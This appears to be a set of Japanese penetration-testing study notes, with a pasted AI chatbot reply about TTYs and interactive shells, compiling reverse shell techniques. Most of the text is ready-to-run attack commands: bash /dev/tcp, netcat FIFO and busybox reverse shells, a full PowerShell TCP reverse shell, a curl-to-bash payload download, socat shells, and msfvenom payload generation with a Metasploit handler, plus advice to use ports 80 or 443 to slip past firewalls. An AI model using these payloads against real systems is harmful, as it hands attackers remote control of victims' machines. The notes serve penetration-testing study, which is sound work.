...
- 留意点：
	- リバースシェルに指定するポートは、FWによる遮断を防ぐため、原則80 もしくは 443を使用すること
...
ご提示いただいたノートの内容は、概ね状況を捉えていますが、**「なぜ実行できないのか」**という技術的な理由（TTYの有無）を補足すると、より正確で分かりやすくなります。
修正案を作成しました。文体や画像の位置はそのままに、表現をより正確に整えています。
インタラクティブシェル（対話型シェル）
...
修正のポイント
 * TTY（仮想端末）の概念を追加: 非対話型シェルでsshなどが動かない最大の理由は、キーボード入力や画面出力を制御する「TTY」が存在しないためです。この用語を入れると、後の「Python等を使ったTTYの昇格（Upgrade）」の学習に繋がりやすくなります。
 * 「実行できない」理由を明確化: 「双方向のやり取りが必要な〜」を、「ユーザーに入力を求める（プロンプトを出す）プログラム」と言い換えることで、なぜwhoamiは良くてsshはダメなのかが明確になります。
次は、これらの非対話型シェルをインタラクティブなシェルに「昇格（Upgrade）」させる手順についてまとめますか？
...
```zsh
echo '#!/bin/bash
bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1' > /tmp/revshell.sh
...
```zsh
mkfifo /tmp/f; nc <AttackerIP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f
```
- FIFOを使って標準入出力を連携
...
```zsh
busybox nc <AttackerIP> <Port> -e sh
```

##### 補足：名前付きパイプコマンドの解説

- `mkfifo ファイル名`:　FIFO (名前付きパイプ) を作成
	- [[用語#名前付きパイプ]]
- `nc -lvnp <Port>` 　netcatリスナーを（ターゲット上で）起動
- `< /tmp/f | /bin/sh >/tmp/f 2>&1`:  攻撃者がリスナーに接続して入力した内容を"/tmp/f"に書き込み、"/bin/sh"は書き込まれた内容を入力としてshellを実行し、実行結果を標準エラー出力（2）と標準出力（1）も含めて/tmp/fに書き込むことで攻撃者に実行結果を返す
...
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<AttackerIP>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
...
2. ワンライナーを作成（攻撃者マシンのリスナーのIP、ポートを入力）
	- powershellの`-File`に指定してファイルとして実行する場合は、シングルクオートで囲った部分をpsファイルとして保存すればよい
```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<AttackerIP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
...
```zsh
curl <AttackerIP>/exploit.sh | bash
```
...
2. ターゲットマシンから接続
```zsh
socat TCP:<AttackerIP>:<Port> EXEC: "bash -li",pty,stderr,sigint,setsid,sane
```
- `sigint`：Ctrl + Cを可能にする
...
(a) Windowsの場合
```powershell
socat TCP:<AttackerIP>:<Port> EXEC:powershell.exe,pipes
```
- pipesオプションは、powershell（またはcmd.exe）にUnixスタイルの標準入出力を使用させるために使用

(b) Linuxの場合
```zsh
socat TCP:<AttackerIP>:<Port> EXEC:"bash -li"
```
...
1. msfvenomでペイロードの生成
```zsh
sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <file>.<出力形式> LHOST=<listen-IP> LPORT=<listen-port>
```

2. 1024番ポート以下を使用するときはsudoで
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload <生成ペイロード>; set LHOST <AttackerIP>; set LPORT <Port>; run"
```
